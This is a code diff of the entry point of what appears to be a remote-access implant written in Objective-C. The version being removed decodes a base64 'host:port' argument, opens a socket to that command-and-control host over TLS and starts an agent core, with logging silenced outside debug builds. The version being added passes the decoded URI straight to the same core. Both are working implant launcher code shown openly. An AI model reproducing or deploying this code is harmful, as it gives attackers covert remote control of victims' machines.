@@ -1,3 +1,4 @@
+
 /*
  * MIT License
  *
@@ -24,93 +25,36 @@
 
 #import <Foundation/Foundation.h>
 
-#include <stdlib.h>
-#include <stdio.h>
-#include <unistd.h>
-
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-
-#include <c2.h>
-#include <net.h>
 #include <core.h>
 
-#ifdef DEBUG
-#define NSLog(...) NSLog(__VA_ARGS__)
-#else
-#define NSLog(...) NULL
-#endif
-
-int connectTo(NSString *hostPart, int portPart)
+int main(int argc, const char *argv[])
 {
-    int sock;
-    struct sockaddr_in hint;
-
-    NSLog(@"Will connect to %@:%d\n", hostPart, portPart);
-
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-
-    if (sock == -1)
-    {
-        return -1;
-    }
-
-    hint.sin_family = AF_INET;
-    hint.sin_port = htons(portPart);
-    hint.sin_addr.s_addr = inet_addr([hostPart UTF8String]);
-
-    if (connect(sock, (struct sockaddr *)&hint, sizeof(hint)) != 0)
-    {
-        return -1;
-    }
-
-    return sock;
-}
-
-int main(int argc, const char *argv[]) {
-    int sock;
-
     NSString *decodedString;
     NSString *encodedString;
-
     NSData *decodedData;
-    NSArray *pairedData;
 
-    c2_t *c2;
     core_t *core;
 
-    @autoreleasepool {
-        if (argc < 2) {
+    @autoreleasepool
+    {
+        if (argc < 2)
+        {
             return 1;
         }
 
         encodedString = [NSString stringWithFormat:@"%s", argv[1]];
         decodedData = [[NSData alloc] initWithBase64EncodedString:encodedString options:0];
         decodedString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
-        pairedData = [decodedString componentsSeparatedByString:@":"];
 
-        if (pairedData.count < 2)
-        {
-            return -1;
-        }
+        core = core_create();
 
-        c2 = NULL;
-        sock = connectTo(pairedData[0], [pairedData[1] intValue]);
+        core_setup(core);
+        core_set_path(core, realpath(argv[0], NULL));
+        core_add_uri(core, (char *)[decodedString UTF8String]);
 
-        c2_add_sock(&c2, 0, sock, NET_PROTO_TLS);
-        c2->path = realpath(argv[0], NULL);
-
-        if ([pairedData count] >= 3)
-        {
-            c2->uuid = strdup([pairedData[2] UTF8String]);
-        }
-
-        core = core_create(c2);
         core_start(core);
-
-        c2_free(c2);
         core_destroy(core);
     }
+
     return 0;
 }
